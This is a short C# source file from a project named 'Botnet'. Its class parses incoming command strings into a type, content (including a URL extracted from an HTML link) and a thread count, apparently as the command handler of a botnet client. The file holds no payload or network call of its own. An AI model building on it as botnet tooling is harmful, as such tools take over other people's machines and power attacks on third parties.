using System.Text.RegularExpressions;

namespace Botnet
{
    class cmd
    {
        public string ComType { get; private set; }
        public string ComContent { get; private set; }
        public string ComThreads { get; private set; }

        public cmd(string input_content)
        {
            string[] cmd_cnt = input_content.Split(config.spliter);

            ComType = cmd_cnt[0];
            if(cmd_cnt.Length >= 2 && !cmd_cnt[1].Contains("</a>"))
                ComContent = cmd_cnt[1];
            else if (cmd_cnt.Length > 1)
            {
                Match regx = Regex.Match(cmd_cnt[1], "href\\s*=\\s*(?:[\"'](?<1>[^\"']*)[\"']|(?<1>\\S+))");
                ComContent = regx.Groups[1].Value;
            }
            if (cmd_cnt.Length == 3)
            {
                ComThreads = cmd_cnt[2];
            }
        }
    }
}
